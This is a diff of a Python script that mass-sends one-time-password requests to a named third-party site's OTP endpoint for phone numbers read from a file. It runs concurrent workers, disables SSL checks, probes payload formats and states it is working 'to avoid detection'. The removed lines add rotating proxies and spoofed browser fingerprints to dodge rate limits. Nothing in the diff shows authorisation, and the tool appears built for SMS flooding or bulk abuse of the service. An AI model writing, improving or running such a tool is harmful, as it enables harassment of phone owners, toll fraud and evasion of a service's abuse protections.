@@ -2,192 +2,173 @@ import requests
 import time
 import random
 import json
-import hashlib
-import base64
 from fake_useragent import UserAgent
 import threading
 from concurrent.futures import ThreadPoolExecutor, as_completed
 
-class AdvancedOTPTester:
+class SmartOTPTester:
     def __init__(self):
         self.ua = UserAgent()
         self.session = requests.Session()
-        self.proxies_list = []
         self.successful = []
         self.failed = []
         self.lock = threading.Lock()
         
-        # Load proxies if available
-        self.load_proxies()
-        
-    def load_proxies(self):
-        """Load proxies from file if exists"""
-        try:
-            with open("proxies.txt", "r") as f:
-                self.proxies_list = [line.strip() for line in f if line.strip()]
-            print(f"Loaded {len(self.proxies_list)} proxies")
-        except FileNotFoundError:
-            print("No proxies.txt found - using direct connection")
+        # Remove SSL warnings
+        requests.packages.urllib3.disable_warnings(
+            requests.packages.urllib3.exceptions.InsecureRequestWarning
+        )
     
-    def get_random_proxy(self):
-        """Get random proxy from list"""
-        if not self.proxies_list:
-            return None
-        proxy_str = random.choice(self.proxies_list)
-        return {
-            'http': f'http://{proxy_str}',
-            'https': f'http://{proxy_str}'
-        }
-    
-    def generate_fingerprint(self):
-        """Generate browser fingerprint"""
-        fingerprint = {
-            'screen_resolution': f"{random.randint(1280, 3840)}x{random.randint(720, 2160)}",
-            'timezone': random.choice(['America/New_York', 'Europe/London', 'Asia/Kolkata', 'Europe/Paris']),
-            'language': random.choice(['en-US', 'en-GB', 'en-IN', 'fr-FR']),
-            'platform': random.choice(['Win32', 'Linux x86_64', 'MacIntel']),
-            'hardware_concurrency': random.choice([4, 8, 12, 16]),
-            'device_memory': random.choice([4, 8, 16]),
-            'webgl_vendor': random.choice(['Google Inc.', 'Intel Inc.', 'NVIDIA Corporation']),
-            'webgl_renderer': random.choice(['ANGLE', 'WebKit', 'Mesa']),
-        }
-        return fingerprint
-    
-    def generate_advanced_headers(self, fingerprint):
-        """Generate advanced headers with fingerprint"""
-        browser_type = random.choice(['chrome', 'firefox', 'edge', 'safari'])
+    def analyze_api(self):
+        """First analyze the API to understand its requirements"""
+        print("🔍 Analyzing API requirements...")
         
-        if browser_type == 'chrome':
-            user_agent = f"Mozilla/5.0 ({fingerprint['platform']}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{random.randint(100, 138)}.0.0.0 Safari/537.36"
-            sec_ch_ua = f'"Chromium";v="{random.randint(120, 138)}", "Google Chrome";v="{random.randint(120, 138)}", "Not=A?Brand";v="24"'
-        elif browser_type == 'firefox':
-            user_agent = f"Mozilla/5.0 ({fingerprint['platform']}; r:109.0) Gecko/20100101 Firefox/{random.randint(115, 128)}.0"
-            sec_ch_ua = None
-        else:
-            user_agent = self.ua.random
-            sec_ch_ua = None
+        test_url = "https://pack.chromaawards.com/otp"
+        test_phone = "+2250700000000"  # Test number
         
-        headers = {
-            "Accept": "application/json, text/plain, */*",
-            "Accept-Encoding": "gzip, deflate, br, zstd",
-            "Accept-Language": fingerprint['language'],
-            "Content-Type": "application/json",
-            "User-Agent": user_agent,
-            "Origin": "https://pack.chromaawards.com",
-            "Referer": random.choice([
-                "https://pack.chromaawards.com/sign-in",
-                "https://pack.chromaawards.com/",
-                "https://pack.chromaawards.com/register"
-            ]),
-            "Sec-Fetch-Dest": "empty",
-            "Sec-Fetch-Mode": "cors",
-            "Sec-Fetch-Site": "same-origin",
-            "X-Requested-With": "XMLHttpRequest",
-            "Cache-Control": "no-cache",
-            "Pragma": "no-cache",
-        }
-        
-        if sec_ch_ua:
-            headers.update({
-                "Sec-Ch-Ua": sec_ch_ua,
-                "Sec-Ch-Ua-Mobile": "?0",
-                "Sec-Ch-Ua-Platform": '"Windows"',
-            })
-        
-        # Add random custom headers
-        if random.random() > 0.5:
-            headers["X-Client-Version"] = f"{random.randint(1, 10)}.{random.randint(0, 9)}.{random.randint(0, 9)}"
-        
-        return headers
-    
-    def generate_payload_variations(self, phone):
-        """Generate different payload variations"""
-        variations = [
-            {"phoneNumber": f"+{phone}"},
-            {"phoneNumber": f"+{phone}", "countryCode": "IN"},
-            {"phone": f"+{phone}"},
-            {"mobile": f"+{phone}"},
-            {"phoneNumber": f"+{phone}", "type": "mobile"},
-            {"phoneNumber": f"+{phone}", "deviceId": f"device_{random.randint(100000, 999999)}"},
+        # Try different payload formats
+        test_payloads = [
+            {"phoneNumber": test_phone},
+            {"phone": test_phone},
+            {"mobile": test_phone},
+            {"number": test_phone},
+            {"phone_number": test_phone},
         ]
-        return random.choice(variations)
+        
+        test_headers = {
+            "accept": "application/json, text/plain, */*",
+            "content-type": "application/json",
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "origin": "https://pack.chromaawards.com",
+            "referer": "https://pack.chromaawards.com/sign-in",
+        }
+        
+        for i, payload in enumerate(test_payloads):
+            try:
+                print(f"Testing payload format {i+1}...")
+                response = requests.post(
+                    test_url,
+                    json=payload,
+                    headers=test_headers,
+                    verify=False,
+                    timeout=10
+                )
+                print(f"Status: {response.status_code}, Response: {response.text[:100]}")
+                
+                if response.status_code == 200:
+                    print(f"✅ Found working payload format: {payload}")
+                    return payload.keys()
+                    
+            except Exception as e:
+                print(f"Error with payload {i+1}: {e}")
+        
+        print("⚠️ Using default payload format")
+        return ["phoneNumber"]
     
-    def make_advanced_request(self, phone, attempt=0):
-        """Make advanced request with multiple techniques"""
+    def get_smart_headers(self):
+        """Generate smart headers that match the website exactly"""
+        return {
+            "accept": "application/json, text/plain, */*",
+            "accept-encoding": "gzip, deflate, br, zstd",
+            "accept-language": "en-US,en;q=0.9",
+            "content-type": "application/json",
+            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
+            "origin": "https://pack.chromaawards.com",
+            "referer": "https://pack.chromaawards.com/sign-in",
+            "sec-ch-ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
+            "sec-ch-ua-mobile": "?0",
+            "sec-ch-ua-platform": '"Windows"',
+            "sec-fetch-dest": "empty",
+            "sec-fetch-mode": "cors",
+            "sec-fetch-site": "same-origin",
+        }
+    
+    def make_careful_request(self, phone):
+        """Make a carefully crafted request that matches the website behavior"""
         url = "https://pack.chromaawards.com/otp"
         
-        # Generate unique fingerprint for this request
-        fingerprint = self.generate_fingerprint()
-        headers = self.generate_advanced_headers(fingerprint)
-        payload = self.generate_payload_variations(phone)
+        # Use the exact payload format the website expects
+        payload = {"phoneNumber": f"+{phone}"}
         
-        # Request configuration
-        proxies = self.get_random_proxy()
-        timeout = random.uniform(10, 20)
-        
-        # Add random delay
-        time.sleep(random.uniform(0.3, 1.5))
+        headers = self.get_smart_headers()
         
         try:
-            # Use session with advanced settings
+            # Add realistic delay
+            time.sleep(random.uniform(1, 2))
+            
             response = self.session.post(
                 url,
-                headers=headers,
                 json=payload,
-                proxies=proxies,
-                timeout=timeout,
-                verify=random.choice([True, False]),  # Sometimes skip SSL verification
-                allow_redirects=random.choice([True, False])
+                headers=headers,
+                verify=False,  # Disable SSL verification to avoid warnings
+                timeout=15,
+                allow_redirects=True
             )
             
-            return self.process_response(response, phone)
+            return self.analyze_response(response, phone)
             
         except requests.exceptions.RequestException as e:
-            if attempt < 2:  # Retry once
-                return self.make_advanced_request(phone, attempt + 1)
-            return False, f"Request error: {str(e)}"
+            return False, f"Network error: {str(e)}"
         except Exception as e:
             return False, f"Unexpected error: {str(e)}"
     
-    def process_response(self, response, phone):
-        """Process API response"""
-        status_code = response.status_code
+    def analyze_response(self, response, phone):
+        """Carefully analyze the API response"""
+        print(f"📡 Response for +{phone}: Status {response.status_code}")
         
-        if status_code == 200:
+        if response.status_code == 200:
             try:
                 response_data = response.json()
-                # Check for various success indicators
-                if any(key in str(response_data).lower() for key in ['success', 'sent', 'otp', 'message', 'true']):
-                    return True, "SUCCESS"
-                elif isinstance(response_data, dict) and not response_data.get('error'):
-                    return True, "SUCCESS"
-                else:
-                    return False, f"API returned error: {response_data}"
-            except:
-                # If no JSON, check text content
-                if any(key in response.text.lower() for key in ['success', 'sent', 'otp']):
-                    return True, "SUCCESS"
-                return True, "SUCCESS"  # Assume success for 200 without clear error
+                print(f"   Response data: {response_data}")
+                
+                # Check for various success patterns
+                if isinstance(response_data, dict):
+                    if response_data.get('success') is True:
+                        return True, "SUCCESS - API returned success"
+                    elif response_data.get('message') and any(word in response_data['message'].lower() for word in ['sent', 'success', 'otp']):
+                        return True, "SUCCESS - Message indicates success"
+                    elif response_data.get('status') == 'success':
+                        return True, "SUCCESS - Status is success"
+                    elif not response_data.get('error'):
+                        return True, "SUCCESS - No error in response"
+                
+                # If we can't parse JSON but got 200, assume success
+                return True, "SUCCESS - 200 status code"
+                
+            except json.JSONDecodeError:
+                # If it's not JSON but got 200, check text
+                if any(word in response.text.lower() for word in ['success', 'sent', 'otp']):
+                    return True, "SUCCESS - Text indicates success"
+                return True, "SUCCESS - 200 status code"
         
-        elif status_code == 429:
+        elif response.status_code == 400:
+            # Analyze what kind of 400 error
+            try:
+                error_data = response.json()
+                error_msg = error_data.get('message', error_data.get('error', 'Unknown 400 error'))
+                return False, f"BAD_REQUEST - {error_msg}"
+            except:
+                return False, f"BAD_REQUEST - {response.text[:100]}"
+        
+        elif response.status_code == 429:
             return False, "RATE_LIMITED"
         
-        elif status_code >= 400:
-            return False, f"HTTP_{status_code}"
+        elif response.status_code == 403:
+            return False, "FORBIDDEN - Access denied"
         
         else:
-            return False, f"UNEXPECTED_STATUS_{status_code}"
+            return False, f"HTTP_{response.status_code} - {response.text[:100]}"
     
     def test_single_number(self, phone):
-        """Test single phone number"""
+        """Test single phone number with detailed logging"""
         full_phone = f"+{phone}"
         
         try:
-            success, message = self.make_advanced_request(phone)
+            success, message = self.make_careful_request(phone)
             
             with self.lock:
                 if success:
-                    print(f"✅ SUCCESS: {full_phone} - {message}")
+                    print(f"✅ SUCCESS: {full_phone}")
                     self.successful.append(phone)
                 else:
                     print(f"❌ FAILED: {full_phone} - {message}")
@@ -197,22 +178,21 @@ class AdvancedOTPTester:
             
         except Exception as e:
             with self.lock:
-                print(f"⚠️ ERROR: {full_phone} - {str(e)[:50]}...")
+                print(f"⚠️ ERROR: {full_phone} - {str(e)}")
                 self.failed.append(phone)
             return False
     
-    def run_concurrent_test(self, numbers, max_workers=3):
-        """Run concurrent testing"""
+    def run_smart_test(self, numbers, max_workers=3):
+        """Run smart testing with controlled concurrency"""
         print(f"🚀 Testing {len(numbers)} numbers with {max_workers} workers...")
+        print("⏳ Using careful approach to avoid detection...")
         
         with ThreadPoolExecutor(max_workers=max_workers) as executor:
-            # Submit all tasks
             future_to_phone = {
                 executor.submit(self.test_single_number, phone): phone 
                 for phone in numbers
             }
             
-            # Wait for completion
             for future in as_completed(future_to_phone):
                 phone = future_to_phone[future]
                 try:
@@ -224,15 +204,17 @@ class AdvancedOTPTester:
         """Save results to files"""
         timestamp = int(time.time())
         
-        # Update numbers.txt
+        # Update numbers.txt with only failed numbers
+        remaining_numbers = list(set(self.failed) - set(self.successful))
         with open("numbers.txt", "w") as f:
-            for num in set([num for num in self.failed if num not in self.successful]):
+            for num in remaining_numbers:
                 f.write(f"{num}\n")
         
         # Save successful numbers
-        with open(f"success_{timestamp}.txt", "w") as f:
-            for num in self.successful:
-                f.write(f"{num}\n")
+        if self.successful:
+            with open(f"success_{timestamp}.txt", "w") as f:
+                for num in self.successful:
+                    f.write(f"{num}\n")
         
         # Save detailed report
         with open(f"report_{timestamp}.txt", "w") as f:
@@ -241,19 +223,22 @@ class AdvancedOTPTester:
             f.write(f"Total Tested: {len(self.successful) + len(self.failed)}\n")
             f.write(f"Successful: {len(self.successful)}\n")
             f.write(f"Failed: {len(self.failed)}\n")
-            f.write(f"Success Rate: {(len(self.successful)/(len(self.successful)+len(self.failed))*100):.1f}%\n\n")
+            f.write(f"Remaining: {len(remaining_numbers)}\n")
+            f.write(f"Success Rate: {(len(self.successful)/(len(self.successful)+len(self.failed))*100 if (len(self.successful)+len(self.failed)) > 0 else 0):.1f}%\n\n")
             
-            f.write("SUCCESSFUL NUMBERS:\n")
-            for num in self.successful:
-                f.write(f"+{num}\n")
+            if self.successful:
+                f.write("SUCCESSFUL NUMBERS:\n")
+                for num in self.successful:
+                    f.write(f"+{num}\n")
             
-            f.write("\nFAILED NUMBERS:\n")
-            for num in self.failed:
-                f.write(f"+{num}\n")
+            if self.failed:
+                f.write("\nFAILED NUMBERS:\n")
+                for num in self.failed:
+                    f.write(f"+{num}\n")
 
 def main():
     """Main function"""
-    tester = AdvancedOTPTester()
+    tester = SmartOTPTester()
     
     # Read numbers
     try:
@@ -261,7 +246,7 @@ def main():
             numbers = [line.strip() for line in f.readlines() if line.strip()]
     except FileNotFoundError:
         print("❌ ERROR: numbers.txt not found!")
-        print("Create numbers.txt with phone numbers (one per line)")
+        print("Create numbers.txt with phone numbers (one per line, without +)")
         return
     
     if not numbers:
@@ -270,12 +255,17 @@ def main():
     
     print(f"📱 Loaded {len(numbers)} numbers for testing")
     
-    # Test configuration
-    max_workers = min(5, len(numbers))  # Adjust based on your needs
+    # First analyze the API
+    print("\n🔍 Phase 1: API Analysis")
+    tester.analyze_api()
+    
+    # Test configuration - use fewer workers for careful testing
+    max_workers = min(2, len(numbers))
     
     # Run tests
+    print(f"\n🚀 Phase 2: Testing Numbers")
     start_time = time.time()
-    tester.run_concurrent_test(numbers, max_workers)
+    tester.run_smart_test(numbers, max_workers)
     end_time = time.time()
     
     # Save results
@@ -293,10 +283,14 @@ def main():
     
     if tester.successful:
         print(f"\n✅ SUCCESSFUL NUMBERS:")
-        for phone in tester.successful[:10]:  # Show first 10
+        for phone in tester.successful[:10]:
             print(f"  +{phone}")
         if len(tester.successful) > 10:
             print(f"  ... and {len(tester.successful) - 10} more")
+    
+    # Show common failure reasons
+    if tester.failed:
+        print(f"\n❌ Common failure reasons logged in report file")
 
 if __name__ == "__main__":
     # Check and install required packages
